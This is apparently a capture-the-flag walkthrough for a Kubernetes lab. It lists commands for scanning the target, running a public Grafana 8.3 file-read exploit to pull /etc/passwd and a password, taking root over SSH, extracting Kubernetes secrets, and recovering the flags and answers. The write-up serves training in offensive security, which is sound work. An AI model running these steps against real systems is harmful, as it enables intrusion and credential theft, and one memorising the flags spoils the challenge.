### Task 1 -  Access the Cluster

```bash 
Find the username?

nmap -sV -sC -A -Pn <ip_address>

Visit <ip_address>: 5000 -> view-source -> main.css
https://pastebin.com/cPs69B0y
Base decode string using https://gchq.github.io/CyberChef/ using Magic

username = vagrant
```
```bash
Find the password:

Visit <ip_address>:3000 -> Grafana version 8.3
Download script https://www.exploit-db.com/exploits/50581
python3 50581.py -H http://<ip_address>:3000
Read file > /etc/passwd
grafana:x:472:0:hereiamatctf907:/home/grafana:/sbin/nologin

password = hereiamatctf907
```
---

### Task 2 - Your Secret Crush
```bash
ssh vagrant@<ip_address>
Enter password from step 1

vagrant@johnny:~$ sudo su root
root@johnny

ps aux to see that Server has k0s installed - https://k0sproject.io/
kube-ap+ 1204 14.9 20.6 986508 207844 ? Sl 01:13 2:58 /var/lib/k0s/

k0s kubectl get secrets

NAME                  TYPE                                  DATA   AGE
default-token-nhwb5   kubernetes.io/service-account-token   3      467d
k8s.authentication    Opaque

k0s kubectl edit secret k8s.authentication

apiVersion: v1
data:
  id: VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9
kind: Secret

echo "VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9" | base64 -d

THM{yes_there_$s_no_$ecret}
```
---

### Task 3 - Game of Pods
This part took forever...

```bash
cd var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes

git log

git show 4b2c2d74b31d922252368c112a3907c5c1cf1ba3

THM{this_joke_is_cold_joke}
```
---

### Task 4 - Hack a Job at FANG
```bash
k0s kubectl describe pod internship-job-5drbm -n internship

Command:
  echo
  26c3d1c068e7e01599c3612447410b5e56c779f1

Google search for this hash, returns:
https://hashtoolkit.com/generate-hash/?text=chidori

chidori
```
---